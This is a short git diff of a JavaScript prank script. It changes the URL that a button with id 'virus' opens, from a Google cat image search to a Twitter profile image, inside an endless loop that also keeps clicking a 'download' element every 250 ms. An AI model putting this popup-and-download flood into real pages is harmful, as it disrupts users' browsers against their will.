@@ -27,7 +27,7 @@ window.onload = function(){
 
 document.getElementById("virus").onclick = function(){
     while(true){
-        window.open("https://www.google.com/search?q=%E7%8C%AB&source=lnms&tbm=isch&sa=X&ved=2ahUKEwjypqu4ravsAhVFHaYKHVKiBDwQ_AUoAnoECCcQBA&biw=1280&bih=578&dpr=1.5",Math.random(),"width=a,height=a");
+        window.open("https://pbs.twimg.com/profile_images/461017900099203072/9iZtDGpm_400x400.jpeg",Math.random(),"width=a,height=a");
         document.getElementById("download").click();
         sleep(250);
     }
